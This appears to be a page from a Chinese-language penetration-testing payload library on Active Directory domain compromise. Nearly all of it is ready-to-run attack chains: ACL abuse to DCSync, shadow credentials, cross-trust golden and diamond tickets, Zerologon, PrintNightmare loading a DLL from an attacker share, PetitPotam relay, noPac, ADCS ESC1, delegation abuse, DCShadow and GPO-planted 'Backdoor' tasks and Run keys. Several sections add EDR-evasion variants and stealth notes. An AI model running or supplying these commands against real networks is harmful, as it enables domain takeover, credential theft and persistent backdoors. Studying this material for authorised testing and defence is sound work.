# 内网/后渗透 — 域渗透攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:Kerberoasting / AS-REP / Golden Ticket / Silver Ticket / DCSync / Constrained Delegation / Unconstrained / Resource-Based / NoPac

---

### 域内权限提升路径  `domain-privilege-escalation`
利用ACL错误配置进行域权限提升
子类：**权限提升** · tags: `acl` `privilege` `active-directory` `escalation`

**前置条件：** 域环境；普通域用户凭证；BloodHound分析结果

**攻击链：**

**1. BloodHound分析**
_查询到域管理员的最短路径_
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**2. 查找WriteDACL**  _[windows]_
_查找WriteDACL权限_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**3. 利用WriteDACL**  _[windows]_
_添加DCSync权限_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
```

**4. 执行DCSync**  _[windows]_
_执行DCSync获取域管哈希_
```
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
```

**5. 查找GenericAll**  _[windows]_
_查找GenericAll权限_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**6. 重置密码**  _[windows]_
_重置目标用户密码_
```
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

**EDR 绕过变体：**

**1. 隐蔽操作**
_指定域控制器操作_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
```

**分析：** 域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。

**OPSEC：** ACL修改会产生日志；优先使用隐蔽的权限；BloodHound可以发现攻击路径

### 危险ACE权限速查表

| ACE权限 | Hex值 | 攻击方式 | 工具 |
|---------|-------|---------|------|
| **GenericAll** | `0x10000000` | 完全控制目标对象 → 重置密码/强制密码更改/Kerberoast | `Set-DomainUserPassword` / `net user` |
| **GenericWrite** | `0x40000000` | 写任意属性 → 修改 `servicePrincipalName` 做 Kerberoast / 修改 `scriptPath` 做登录代码执行 | `Set-DomainObject` / bloodyAD |
| **WriteDACL** | `0x00040000` | 修改 DACL → 给自己加 GenericAll / DCSync 权限 | `dacledit.py` / `Add-DomainObjectAcl` |
| **WriteOwner** | `0x00080000` | 修改所有者 → 获得对象完全控制 → 再改 DACL | `owneredit.py` / `Set-DomainObjectOwner` |
| **ForceChangePassword** | ExtendedRight | 无需知道旧密码直接重置 → 接管账户 | `Set-DomainUserPassword` / bloodyAD |
| **Self** | ExtendedRight | 自身可写特定属性 → 添加SPN做Kerberoast | `Set-ADObject` |
| **AllExtendedRights** | ExtendedRight | 含所有扩展权限 → Reset Password + DCSync + 更多 | 同 GenericAll 工具链 |

**BloodHound 查询：**
```
# 当前用户到域管理员的攻击路径
MATCH p=shortestPath((n:User {owned: true})-[*1..]->(m:Group {name: "DOMAIN ADMINS@DOMAIN.COM"})) RETURN p

# 所有 ACL 边（含 WriteDACL / GenericAll 等）
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword|AllExtendedRights|Owns]->(m) RETURN n.name, type(r), m.name
```

### Shadow Credentials（影子凭据）  `shadow-credentials`
利用 GenericWrite/GenericAll + PKINIT 创建影子凭据进行无密码认证
子类：**Shadow Credentials** · tags: `shadow-credentials` `pkinit` `acl` `certificate`

**前置条件：** 对目标用户/计算机有 GenericWrite/GenericAll 权限；域环境支持 PKINIT（默认 Windows Server 2016+）

**攻击链：**

**1. 写入 KeyCredentialLink**  _[linux]_

```
# pywhisker：向目标对象写入 msDS-KeyCredentialLink
python3 pywhisker.py -d domain.com -u controlled_user -p 'password' --target TARGET_USER --action add -dc-ip DC_IP

# 输出：TARGET_USER.pfx → 影子凭据证书

# 或使用 certipy
certipy shadow auto -u controlled_user@domain.com -p 'password' -account TARGET_USER -dc-ip DC_IP
```

**2. 通过 PKINIT 获取 TGT**  _[linux]_

```
# PKINITtools：用 .pfx 证书通过 PKINIT 获取 TGT
python3 gettgtpkinit.py -cert-pfx TARGET_USER.pfx 'domain.com/TARGET_USER' target.ccache

# 验证 TGT 有效
export KRB5CCNAME=target.ccache
klist
```

**3. 获取 NTLM Hash（可选）**  _[linux]_

```
# 方式A: 用 TGT 做 U2U (user-to-user) 获取 NT hash
python3 getnthash.py -key <AS-REP-encryption-key> 'domain.com/TARGET_USER'

# 方式B: 如果目标是 DC 且有 DCSync 权限
export KRB5CCNAME=target.ccache
impacket-secretsdump -k -no-pass domain.com/TARGET_USER@DC_IP
```

**4. 清理**  _[linux]_

```
# 攻击完成后删除 KeyCredentialLink
python3 pywhisker.py -d domain.com -u controlled_user -p 'password' --target TARGET_USER --action remove -dc-ip DC_IP --device-id <DEVICE_ID>
```

**Shadow Credentials vs 重置密码：**
| 方式 | Shadow Credentials | 密码重置 |
|------|-------------------|---------|
| 隐蔽性 | **高**（不更改密码） | 低（用户无法登录） |
| 可持续性 | 高（凭据持久有效直到清理） | 低（密码被重置后失效） |
| 日志 | PKINIT 认证事件（较罕见） | 密码更改事件 4724/4723（常见告警） |
| 支持版本 | Windows Server 2016+ | 所有版本 |

---

### 跨域信任攻击  `domain-cross-trust`
利用域信任关系进行跨域攻击
子类：**跨域攻击** · tags: `trust` `cross-domain` `active-directory` `forest`

**前置条件：** 已获取源域权限；存在域信任关系；目标域信息

### 域信任类型速查

| 信任类型 | SID过滤 | 信任方向 | ExtraSid可用 | 描述 |
|---------|--------|---------|-------------|------|
| **Parent-Child** | ❌ 关闭 | 双向 | ✅ | 父子域间自动建立 |
| **Forest** | ❌ 关闭 | 单向/双向 | ✅ | 林信任，跨林资源访问 |
| **External** | ✅ 开启 | 单向 | ❌（需绕过） | 外部域，NT4方式 |
| **Realm** | N/A | 单向/双向 | N/A | 与非Windows Kerberos Realm |

> **SID过滤状态决定攻击策略**：Parent-Child/Forest 未启用 SID 过滤 → ExtraSid 可用；External 信任 SID 过滤开启 → 无法直接用 ExtraSid。

**攻击链：**

**1. 枚举信任关系**  _[windows]_
_枚举域信任关系_
```
Get-NetDomainTrust
```

**2. 枚举森林信任**  _[windows]_
_枚举森林信任关系_
```
Get-NetForestTrust
```

**3. 跨域用户枚举**  _[windows]_
_枚举目标域用户_
```
Get-NetUser -Domain target.domain.com
```

**4. 跨域组枚举**  _[windows]_
_枚举目标域组_
```
Get-NetGroup -Domain target.domain.com
```

**5. SID History攻击**  _[windows]_
_利用SID History跨域提权_
```
mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
```

**6. 跨域票据**  _[windows]_
_请求目标域票据_
```
asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
```

### ExtraSid Golden Ticket（父子域/林信任跨域攻击）

```
# 原理：在源域 Golden Ticket 中注入目标域的 SID → TGT 含管理员 SID
# 条件：Parent-Child 或 Forest 信任（SID 过滤关闭）

# Mimikatz 方式：
mimikatz # kerberos::golden /domain:child.domain.com /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519,S-1-5-21-PARENT-512 /krbtgt:<child_krbtgt_NTLM> /user:fakeadmin /ptt

# Impacket ticketer.py 方式：
python3 ticketer.py -domain child.domain.com -domain-sid S-1-5-21-CHILD -extra-sid S-1-5-21-PARENT-519,S-1-5-21-PARENT-512 -nthash <krbtgt_hash> -user-id 500 administrator

# 攻击链：
# 1. 获取子域 krbtgt hash（DCSync 子域 DC）
# 2. 构造 ExtraSid Golden Ticket → 含父域 DA SID (512) + EA SID (519)
# 3. 导入票据 → 访问父域资源 → DCSync 父域 DC
# 4. 通过 raiseChild.py 自动化
python3 raiseChild.py child.domain.com/administrator:'password'@CHILD_DC_IP
```

### Diamond Ticket（金刚石票据） `diamond-ticket`

```
# 原理：对真实 TGT 做解密-修改-重加密（修改 PAC 中的 SID 组），比 Golden Ticket 更隐蔽
# 优势：使用真实 TGT 的 ticket info，日志特征与 Golden Ticket 不同

# 利用 Rubeus：
Rubeus.exe diamond /ticketid:0x12345 /groups:512,519 /user:administrator /krbkey:<krbtgt_aes256> /ticketuserid:500 /ticketuser:administrator

# 利用 ticketer.py：
# ticketer.py 默认即生成 Diamond Ticket 风格（直接修改 PAC）
python3 ticketer.py -request -domain domain.com -user administrator -aesKey <krbtgt_aes256> -domain-sid S-1-5-21-DOMAIN -extra-pac ...
```

### Trust Ticket（Inter-Realm TGT，跨域信任票据）

```
# 原理：利用信任账户（Trust Account）的凭据创建跨域 TGT
# 信任账户名格式：源域 NETBIOS$ 

# 1. 获取信任账户 hash
impacket-secretsdump domain.com/user@SOURCE_DC -just-dc | grep "DOMAIN\\$"
# 或 DCSync 指定信任账户
mimikatz # lsadump::dcsync /domain:child.domain.com /user:PARENT\$

# 2. 用信任账户凭据生成 Inter-Realm TGT
python3 ticketer.py -domain child.domain.com -domain-sid S-1-5-21-CHILD -user administrator -nthash <trust_account_hash> -extra-sid S-1-5-21-PARENT-519 -spn krbtgt/PARENT.DOMAIN.COM

# 3. 跨域 SIDHistory 进阶
# 如果父域有 ForeignGroupMember 指向子域 → 子域用户可往父域组加成员
```

### SID 过滤绕过（External Trust）

```
# External Trust 默认启用 SID 过滤，但以下技术可绕过：
# 1. 如果 TGT 中无 extra-sids（完全在目标域添加）
# 2. Forest 升级路径：External → Forest（需域管理员配置更改）
# 3. MSSQL 链接服务器跨林（使用 xp_cmdshell）
# 4. 利用非约束委派跨森林
```

**EDR 绕过变体：**

**1. 隐蔽跨域**
_指定目标域控制器枚举_
```
Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
```

**分析：** 跨域信任攻击可以利用信任关系从低安全域向高安全域移动。

**OPSEC：** 跨域攻击会产生日志；SID History需要特殊权限；森林信任更安全

---

### Zerologon攻击  `zerologon`
CVE-2020-1472 Netlogon提权
子类：**Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`

**前置条件：** 可访问域控制器RPC

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python zerologon_tester.py DC_NAME DC_IP
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python zerologon_exploit.py DC_NAME DC_IP
将DC密码置空
```

**3. 导出哈希**  _[linux]_
_导出哈希_
```
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
导出域内所有哈希
```

**4. 恢复密码**  _[linux]_
_恢复密码_
```
python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
恢复域控密码避免破坏
```

---

### PrintNightmare攻击  `printnightmare`
CVE-2021-34527 打印服务漏洞
子类：**PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`

**前置条件：** 可访问打印服务RPC

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测打印服务_
```
rpcdump.py @DC_IP | grep MS-RPRN
检查打印服务是否可用
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
加载恶意DLL获取SYSTEM权限
```

**3. Impacket利用**  _[linux]_
_使用Impacket_
```
python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
触发加载远程DLL
```

---

### PetitPotam攻击  `petitpotam`
CVE-2021-36942 强制认证攻击
子类：**PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`

**前置条件：** 可访问EFSRPC接口

**攻击链：**

**1. 启动中继**  _[linux]_
_启动NTLM中继_
```
python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
设置NTLM中继到ADCS
```

**2. 触发认证**  _[linux]_
_触发认证_
```
python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
强制DC向攻击者认证
```

**3. 获取证书**  _[linux]_
_获取证书_
```
中继成功后获取用户证书
使用证书进行Pass-the-Cert
```

---

### noPac/SAMAccountName攻击  `samaccountname`
CVE-2021-42278/CVE-2021-42287 域提权
子类：**noPac** · tags: `nopac` `cve-2021-42278` `privesc`

**前置条件：** 普通域用户权限

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python noPac.py domain/user:password -dc-ip DC_IP -debug
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取域管权限
```

**3. 攻击原理**
_攻击原理_
```
1. 创建机器账户(名称类似DC)
2. 清除SPN
3. 请求TGT
4. 删除机器账户
5. 获取域管TGT
```

---

### ADCS滥用攻击  `adcs-abuse`
Active Directory证书服务滥用
子类：**ADCS** · tags: `adcs` `certificate` `domain`

**前置条件：** ADCS服务可访问

**攻击链：**

**1. 枚举ADCS**  _[linux]_
_枚举ADCS配置_
```
certipy find -u user@domain -p password -dc-ip DC_IP
枚举证书模板
```

**2. 请求用户证书**  _[linux]_
_请求证书_
```
certipy req -u user@domain -p password -ca CA_NAME -template User
请求用户证书
```

**3. Pass-the-Cert**  _[linux]_
_使用证书认证_
```
certipy auth -pfx user.pfx -dc-ip DC_IP
使用证书获取TGT
```

**4. Rubeus请求**  _[windows]_
_Rubeus利用_
```
Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
使用Rubeus请求TGT
```

---

### ADCS ESC1漏洞  `adcs-esc1`
证书模板ESC1滥用
子类：**ADCS** · tags: `adcs` `esc1` `certificate`

**前置条件：** 存在ESC1配置的模板

**攻击链：**

**1. 识别ESC1**  _[linux]_
_识别漏洞模板_
```
certipy find -u user@domain -p password -vulnerable
查找ESC1漏洞模板
```

**2. 利用ESC1**  _[linux]_
_请求域管证书_
```
certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
指定SAN为域管
```

**3. 认证为域管**  _[linux]_
_认证为域管_
```
certipy auth -pfx admin.pfx -dc-ip DC_IP
使用证书认证为域管
```

---

---

### Kerberos委派攻击决策树  `delegation-decision-tree`

发现委派配置时，按以下流程选择攻击类型：

```
发现委派账户 (findDelegation.py / BloodHound)
│
├─ 非约束委派 (TrustedForDelegation)
│   ├─ 是DC → 打印Secrets或强制认证触发
│   └─ 非DC → 强制认证 + 提取TGT → DCSync
│       ├─ Coercer (MS-EFSRPC/MS-RPRN/MS-DFSNM)
│       └─ PetitPotam / PrinterBug / DFSCoerce
│
├─ 约束委派 (TrustedToAuthForDelegation + msDS-AllowedToDelegateTo)
│   ├─ 有协议转换 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION)
│   │   → S4U2Self 获取任意用户 ST → S4U2Proxy 访问目标服务
│   └─ 无协议转换 → 只能转发已有票据 → 价值较低
│
├─ 基于资源的约束委派 (msDS-AllowedToActOnBehalfOfOtherIdentity)
│   → 控制该属性可写的账户 → RBCD 攻击
│   → GenericWrite/GenericAll/WriteProperty 到目标计算机
│
└─ Shadow Credentials (msDS-KeyCredentialLink 可写)
    → PKINIT 获取目标 TGT → 无需密码接管
```

**枚举命令：**
```
# Linux：findDelegation.py（一个命令覆盖所有类型）
python3 findDelegation.py domain.com/user:password -dc-ip DC_IP

# Windows：
# 非约束委派
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
# 约束委派
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
# RBCD
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

### 非约束委派攻击  `unconstrained-delegation`
利用非约束委派捕获TGT
子类：**委派攻击** · tags: `delegation` `unconstrained` `kerberos` `tgt`

**前置条件：** 发现非约束委派计算机

**攻击链（以强制认证触发为例）：**

**1. 查找非约束委派**  _[linux]_

```
python3 findDelegation.py domain.com/user:password -dc-ip DC_IP
# 查找 TrustedForDelegation=True 的计算机
```

**2. 设置中继/监听**  _[linux]_

```
# 方式A：若控制了非约束委派主机（提取已缓存的 TGT）
mimikatz.exe "sekurlsa::tickets /export"

# 方式B：强制 DC 回连（需要非约束委派主机管理员权限）
# 在非约束委派主机上监听，触发 DC 回连
# DC 的 TGT 将被缓存到该主机 LSASS 中
```

**3. 强制认证触发器**

```
# 打印Spooler触发（MS-RPRN）
python3 printerbug.py domain.com/user:password@DC_IP UNCONSTRAINED_HOST_IP
# 或 PetitPotam
python3 petitpotam.py -u user -p password -d domain.com UNCONSTRAINED_HOST_IP DC_IP
```

---

### 域攻击工具扩展  `domain-tools`
常用域攻击工具速查
子类：**工具** · tags: `tools` `domain` `enum`

| 工具 | 能力 | 典型命令 |
|------|------|---------|
| **bloodyAD** | LDAP 对象操作，ACL 滥用自动化 | `bloodyAD.py -u user -p password -d domain.com --host DC_IP getObjectAttributes user TARGET` |
| **ldeep** | LDAP 深度枚举 | `ldeep ldap -u user -p password -s ldap://DC_IP all domain.com` |
| **enum4linux-ng** | SMB 综合枚举（兼容老旧 Windows） | `enum4linux-ng -A -u user -p password DC_IP` |
| **gMSADumper** | 组托管服务账户密码提取 | `gMSADumper.py -u user -p password -d domain.com -l DC_IP` |
| **certipy** | ADCS 全链路攻击 | `certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable` |
| **findDelegation.py** | 委派配置发现（含RBCD） | `findDelegation.py domain.com/user:password -dc-ip DC_IP` |
| **pywhisker** | Shadow Credentials 操作 | `pywhisker.py -d domain.com -u user -p pass --target TARGET -a add` |

---

### 约束委派攻击  `constrained-delegation`
利用约束委派进行横向移动
子类：**委派攻击** · tags: `delegation` `constrained` `kerberos`

**前置条件：** 存在约束委派配置的账户

**攻击链：**

**1. 查找约束委派**  _[windows]_
_查找约束委派账户_
```
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
或
bloodhound查询
```

**2. 获取服务票据**  _[windows]_
_S4U2Self + S4U2Proxy_
```
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
获取域管的服务票据
```

**3. 使用票据**  _[windows]_
_注入票据_
```
Rubeus.exe ptt /ticket:BASE64_TICKET
注入票据并访问服务
```

---

### 基于资源的约束委派  `resource-delegation`
利用RBCD进行权限提升
子类：**委派攻击** · tags: `rbcd` `delegation` `kerberos`

**前置条件：** 对目标对象有WriteDACL权限

**攻击链：**

**1. 创建机器账户**  _[windows]_
_创建机器账户_
```
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
创建新的机器账户
```

**2. 配置RBCD**  _[windows]_
_配置RBCD_
```
Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
设置委派关系
```

**3. 利用RBCD**  _[windows]_
_利用RBCD_
```
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
获取域管票据
```

---

### DCShadow攻击  `dcshadow-attack`
伪造域控制器注入数据
子类：**DCShadow** · tags: `dcshadow` `domain` `injection`

**前置条件：** 域管理员权限；可注册新DC

**攻击链：**

**1. 注册伪造DC**  _[windows]_
_注册伪造DC_
```
mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
注册伪造DC并修改对象属性
```

**2. 推送更改**  _[windows]_
_推送更改_
```
在另一个终端:
mimikatz # lsadump::dcshadow /push
推送更改到真实DC
```

**3. 常见利用**  _[windows]_
_常见利用场景_
```
修改用户组:
/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
添加SID History:
/attribute:sidHistory /value:S-1-5-21-xxx-500
```

---

### 组策略滥用  `group-policy-abuse`
滥用组策略进行横向移动
子类：**组策略** · tags: `gpo` `group-policy` `domain`

**前置条件：** GPO编辑权限

**攻击链：**

**1. 查找可编辑GPO**  _[windows]_
_查找可编辑GPO_
```
Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
查找Domain Users可编辑的GPO
```

**2. 添加计划任务**  _[windows]_
_添加计划任务_
```
New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
添加立即执行的计划任务
```

**3. 添加注册表项**  _[windows]_
_添加注册表启动项_
```
Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
```

---

### SAM The Admin攻击  `sam-the-admin`
CVE-2021-42278/CVE-2021-42287域提权
子类：**SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`

**前置条件：** 域用户权限；域控制器存在漏洞

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python noPac.py domain.com/user:password -dc-ip DC_IP
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取域控权限_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取SYSTEM Shell
```

**3. 执行命令**  _[linux]_
_执行命令_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
```

---

### NoAuth攻击  `noauth`
CVE-2022-33679 Kerberos认证绕过
子类：**NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`

**前置条件：** 域用户权限；目标账户有RC4密钥

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取TGT_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
获取目标用户TGT
```

**3. 使用TGT**  _[linux]_
_使用获取的TGT_
```
设置KRB5CCNAME环境变量
export KRB5CCNAME=administrator.ccache
使用psexec.py等工具
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`13-evasion.md`](13-evasion.md) · 下一篇:[`15-tunneling.md`](15-tunneling.md)
